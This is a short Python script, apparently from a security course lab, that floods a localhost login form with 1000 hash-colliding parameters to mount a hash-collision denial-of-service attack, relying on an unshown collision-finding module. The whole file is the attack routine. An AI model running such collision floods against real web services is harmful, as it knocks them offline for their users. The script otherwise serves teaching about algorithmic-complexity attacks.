from requests import codes, Session
from collisions import find_collisions

LOGIN_FORM_URL = "http://localhost:8080/login"

#This function will send the login form
#with the colliding parameters you specify.
def do_login_form(sess, username,password,params=None):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	if not params is None:
		data_dict.update(params)
	# should return status of 200 if successful
	response = sess.post(LOGIN_FORM_URL,data_dict)
	print(response)


def do_attack():
	sess = Session()
  #Choose any valid username and password
	uname ="victim"
	pw = "victim"
  #Put your colliding inputs in this dictionary as parameters.

	# find 1000 collisions
	key = b'\x00'*16
	collisions_1000 = find_collisions(key, 1000)
	print("test")
	collisions_dict = {}
	for i, c in enumerate(collisions_1000):
			collisions_dict[c] = i
	print(collisions_dict)
	response = do_login_form(sess, uname, pw, collisions_dict)
	print("bruh")


if __name__=='__main__':
	do_attack()
